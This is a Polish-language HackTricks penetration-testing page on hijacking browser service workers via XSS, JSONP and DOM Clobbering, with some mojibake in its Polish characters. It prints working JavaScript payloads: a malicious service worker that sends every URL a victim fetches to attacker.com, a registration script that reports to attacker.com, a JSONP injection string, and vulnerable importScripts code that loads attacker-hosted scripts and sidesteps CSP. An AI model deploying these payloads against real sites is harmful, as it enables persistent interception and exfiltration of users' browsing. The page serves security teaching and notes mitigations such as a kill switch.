# Nadu偶ywanie pracownik贸w usugowych



<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Czy pracujesz w **firmie z bran偶y cyberbezpieczestwa**? Chcesz zobaczy swoj **firm reklamowan na HackTricks**? lub chcesz mie dostp do **najnowszej wersji PEASS lub pobra HackTricks w formacie PDF**? Sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Docz do** [****](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** mnie na **Twitterze** [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakowania, przesyajc PR-y do** [**repozytorium hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**repozytorium hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Podstawowe informacje

**Pracownik usugowy** to skrypt uruchamiany przez przegldark w tle, niezale偶nie od jakiejkolwiek strony internetowej, umo偶liwiajcy funkcje, kt贸re nie wymagaj strony internetowej ani interakcji u偶ytkownika, zwikszajc tym samym mo偶liwoci **przetwarzania offline i w tle**. Szczeg贸owe informacje na temat pracownik贸w usugowych mo偶na znale藕 [tutaj](https://developers.google.com/web/fundamentals/primers/service-workers). Wykorzystujc pracownik贸w usugowych w podatnej domenie internetowej, atakujcy mog przej kontrol nad interakcjami ofiary ze wszystkimi stronami w tej domenie.


### Sprawdzanie istniejcych pracownik贸w usugowych

Istniejce pracowniki usugowe mo偶na sprawdzi w sekcji **Pracownicy usugowi** w zakadce **Aplikacja** w **Narzdziach deweloperskich**. Inn metod jest odwiedzenie [chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals) dla bardziej szczeg贸owego widoku.

### Powiadomienia push

**Uprawnienia do powiadomie push** bezporednio wpywaj na zdolno **pracownika usugowego** do komunikacji z serwerem bez bezporedniej interakcji u偶ytkownika. Jeli uprawnienia s odm贸wione, ogranicza to potencja pracownika usugowego do stanowienia cigego zagro偶enia. W przeciwnym razie udzielenie uprawnie zwiksza ryzyko bezpieczestwa, umo偶liwiajc odbieranie i wykonywanie potencjalnych exploit贸w.

## Atak tworzenia pracownika usugowego

Aby wykorzysta t podatno, musisz znale藕:

* Spos贸b na **przesanie dowolnych plik贸w JS** na serwer i **XSS do zaadowania pracownika usugowego** przesanego pliku JS
* **Podatne 偶danie JSONP**, w kt贸rym mo偶na **manipulowa wynikiem (za pomoc dowolnego kodu JS)** oraz **XSS**, aby **zaadowa JSONP z adunkiem**, kt贸ry **zaaduje zoliwego pracownika usugowego**.

W poni偶szym przykadzie przedstawi kod do **zarejestrowania nowego pracownika usugowego**, kt贸ry bdzie nasuchiwa zdarzenia `fetch` i bdzie **wysya na serwer atakujcego ka偶dy pobrany URL** (to jest kod, kt贸ry musiaby **przesa** na **serwer** lub zaadowa za pomoc **podatnej odpowiedzi JSONP**):
```javascript
self.addEventListener('fetch', function(e) {
e.respondWith(caches.match(e.request).then(function(response) {
fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
A to jest kod, kt贸ry **zarejestruje pracownika** (kod, kt贸ry powiniene by w stanie wykona, wykorzystujc **XSS**). W tym przypadku zostanie wysane 偶danie **GET** do serwera **atakujcego**, **informujce**, czy **rejestracja** pracownika usugi zakoczya si sukcesem, czy nie:
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
.then(function(registration) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/success", true);
xhttp2.send();
}, function (err) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/error", true);
xhttp2.send();
});
});
</script>
```
W przypadku wykorzystania podatnego punktu kocowego JSONP nale偶y umieci warto wewntrz `var sw`. Na przykad:
```javascript
var sw = "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//";
```
Istnieje **C2** dedykowane do **eksploatacji pracownik贸w usugowych** o nazwie [**Shadow Workers**](https://shadow-workers.github.io), kt贸re bd bardzo przydatne do nadu偶ywania tych podatnoci.

Dyrektywa **pamici podrcznej 24-godzinna** ogranicza 偶ywotno zoliwego lub skompromitowanego **pracownika usugowego (SW)** do maksymalnie 24 godzin po naprawie podatnoci XSS, zakadajc status klienta online. Aby zminimalizowa podatno, operatorzy witryn mog obni偶y czas 偶ycia skryptu SW (TTL). Deweloperom zaleca si r贸wnie偶 utworzenie [**przecznika zabijania pracownika usugowego**](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776) dla szybkiej dezaktywacji.

## Nadu偶ywanie `importScripts` w SW za pomoc DOM Clobbering

Funkcja **`importScripts`** wywoana z pracownika usugowego mo偶e **importowa skrypt z innej domeny**. Jeli ta funkcja jest wywoywana z **parametrem, kt贸ry atakujcy m贸gby** zmodyfikowa, m贸gby **importowa skrypt JS z jego domeny** i uzyska XSS.

**Nawet omija to zabezpieczenia CSP.**

**Przykadowy podatny kod:**

* **index.html**
```html
<script>
navigator.serviceWorker.register('/dom-invader/testcases/augmented-dom-import-scripts/sw.js' + location.search);
// attacker controls location.search
</script>
```
* **sw.js**
```javascript
const searchParams = new URLSearchParams(location.search);
let host = searchParams.get('host');
self.importScripts(host + "/sw_extra.js");
//host can be controllable by an attacker
```
### Za pomoc DOM Clobbering

Aby uzyska wicej informacji na temat tego, czym jest DOM Clobbering, sprawd藕:

{% content-ref url="dom-clobbering.md" %}
[dom-clobbering.md](dom-clobbering.md)
{% endcontent-ref %}

Jeli adres URL/domena, z kt贸rej SW korzysta do wywoania **`importScripts`**, znajduje si **w elemencie HTML**, mo偶na go **zmodyfikowa za pomoc DOM Clobbering**, aby sprawi, 偶e SW **zaaduje skrypt z wasnej domeny**.

Aby zobaczy przykad, sprawd藕 link referencyjny.

## Referencje

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

<details>

<summary><strong>Dowiedz si, jak hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Czy pracujesz w **firmie zajmujcej si cyberbezpieczestwem**? Chcesz zobaczy, jak Twoja **firma jest reklamowana w HackTricks**? lub chcesz mie dostp do **najnowszej wersji PEASS lub pobra HackTricks w formacie PDF**? Sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Docz do** [****](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** mnie na **Twitterze** [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**repozytorium hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**repozytorium hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
